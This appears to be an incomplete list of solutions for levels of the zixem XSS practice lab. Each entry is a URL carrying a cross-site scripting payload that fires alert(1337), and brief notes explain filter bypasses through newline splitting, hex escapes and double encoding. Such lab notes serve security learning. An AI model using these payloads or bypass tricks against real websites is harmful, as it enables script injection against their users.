Level 1: [http://www.zixem.altervista.org/XSS/1.php?name=<script>alert(1337)</script>](https://zixem.altervista.org/XSS/1.php?name=%3Cscript%3Ealert(1)%3C/script%3E) \
Level 2: [http://www.zixem.altervista.org/XSS/2.php?name=<scrIpt>alert(1337)</scrIpt>](https://zixem.altervista.org/XSS/2.php?name=%3CscrIpt%3E%20alert(1)%3C/scrIpt%3E) \
Level 3: [https://zixem.altervista.org/XSS/3.php?name=zxm%0A`<img src=”x” onerror=alert(1337)>`](https://zixem.altervista.org/XSS/3.php?name=zxm%0A%3Cimg%20src=%E2%80%9Dx%E2%80%9D%20onerror=alert(1337)%3E) \
  Using %0A URL-encoded representation of a newline character (Line Feed, LF, \n) in ASCII and UTF-8 encoding. \
  Some WAFs only scan for dangerous keywords within a single line. If an attack payload is split across multiple lines \
  (e.g., using %0A for a newline), the filter may fail to detect it, allowing bypass techniques for XSS, SQLi, and other attacks. \
Level 4: [http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20](http://zixem.altervista.org/XSS/4.php?img=htp.pngd'onerror=alert(1337)%20) \
Level 5: https://zixem.altervista.org/XSS/5.php?name=zxm&action=javascript:alert(1337) \
Level 6: https://zixem.altervista.org/XSS/6.php?name=\x3Csvg/onload=alert(1337)\x3E or 
[https://zixem.altervista.org/XSS/6.php?name=\x3Cimg/src="x" onerror=alert(1337)\x3E](https://zixem.altervista.org/XSS/6.php?name=\x3Cimg/src=%22x%22%20onerror=alert(1337)\x3E) \
\x3E and \x3C are hexadecimal escape sequences used in programming languages like JavaScript and C. \
These can be used to bypass WAFs or XSS filters by encoding < and > in attack payloads. \
Level 7 : https://zixem.altervista.org/XSS/7.php?name=zxm%253Cscript%253Ealert(1337)%253C/script%253E \
Double encode < (%253C) and (%253E)> for use in an XSS payload, need to encode them twice using URL encoding \
Level 8 : \ 
Level 9 :[https://zixem.altervista.org/XSS/9.php?name=zxm<svg/onload=alert(1337) >](https://zixem.altervista.org/XSS/9.php?name=zxm%3Csvg/onload=%22alert(1337)%22%3E) \
Level 10 :

